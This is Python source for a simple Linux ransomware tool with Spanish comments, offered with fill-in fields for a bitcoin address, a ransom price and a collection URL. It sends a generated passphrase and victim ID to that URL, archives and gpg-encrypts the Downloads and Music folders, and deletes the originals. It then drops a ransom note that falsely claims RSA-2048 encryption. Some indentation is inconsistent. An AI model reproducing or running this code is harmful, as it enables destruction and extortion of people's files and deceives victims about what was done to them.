import os
import sys
import subprocess
import random
import string
import requests
import re

def linux():
	s = string.ascii_lowercase + string.digits
	pwd = str(''.join(random.sample(s, 30)))
	#Genera un ID unico
	t = string.ascii_lowercase
	idd = str(''.join(random.sample(t, 10)))
	#se ejecutan las funciones para cifrar los datos
	sendCred(url, pwd, idd)
	crypt(directories, pwd)
	howto(directories, bitcoin, price)
	decryptGen(str(directories))

def sendCred(url, pwd, idd):
	values = {'pass' : pwd,'id'	: idd}
	r = requests.post(url, values)
	page = r.text
	if(page != 'Ok.'):
		sys.exit('Ocurrio un error al enviar las credenciales')

def crypt(directory, pwd):
		
		if(type(directory) != list):
			sys.exit('El formato recibido es incorrecto!')

		for dirr in directory:
			os.chdir(dirr)
			os.system('tar cvf encrypted.tar *')
			os.system('find . ! -name encrypted.tar -type f -delete')
			os.system('find . ! -name encrypted.tar -type d -delete')
			os.system('echo ' + pwd + ' | gpg --batch --passphrase-fd 0 -c encrypted.tar')
                        os.system('rm encrypted.tar')
                        os.chdir('../')
                        print "------------------- " 

def howto(directory, bitcoin, price):
    txt = "\n"
    txt +="Hola te estaras preguntando Que paso con tus archivos?\n"
    txt +="todos ellos fueron cifrados con RSA-2048\n"
    txt +="si los quieres recuperar me debes pagar : """ + str(price) + "\n"
    txt +="Mi direccion de bitcoins es: " + bitcoin + "\n"
    txt +="1 bitcoin ~= 240 US $ aproximadamente \n"
    txt +="Cuando recibas el password usa el archivo decrypt.py\n\n" 
    txt +="que tengas un lindo dia y mejor suerte para la otra :)\n\n "
    archivo = open("recuperar-mis-archivos.txt","wb")
    archivo.write(txt)
    archivo.close()
    for dirr in directory:
        os.system("cp 'recuperar-mis-archivos.txt' " + dirr)


def decryptGen(directory):
    txt = ""
    txt +="#!/usr/bin/python3\n"
    txt +="import os\n"
    txt +="import sys\n"
    txt +="directory = " + directory + "\n"
    txt +="pwd = raw_input('Ingrese el password para decifrar los archivos: ')\n"
    txt +="for dirr in directory:\n"
    txt +="    os.chdir(dirr)\n"
    txt +="    if(os.system('gpg --batch --passphrase ' + pwd + ' -d encrypted.tar.gpg > unencrypted.tar') != 0):\n"
    txt +="        sys.exit('Password Incorrecto!')\n"
    txt +="    os.system('tar xvf unencrypted.tar')\n"
    txt +="    os.system('rm unencrypted.tar')\n"
    txt +="    os.system('rm encrypted.tar.gpg')\n"
    txt +="    os.system('rm recuperar-mis-archivos.txt')\n"
    txt +="    os.chdir('../')\n"
    archivo = open("decrypt.py","wb")
    archivo.write(txt)
    archivo.close()


#directorios a cifrar
directories = ['Downloads','Music' ] 
bitcoin	= 'aAhR54GVf45FFf3q2kL' #ingresa aqui tu direccion de BitCoin
price = 3 # Ingresa el monto a pedir
url = 'http://localhost/victima.php' #ingresa la Url a donde se va enviar el id y password

#verificar que sistema operativo esta detras
if(sys.platform == 'Linux' or sys.platform == 'linux2'):
    linux()
elif(sys.platform == 'Windows'):
    sys.exit('Soon supported !')
else:
    sys.exit('Not supported !')




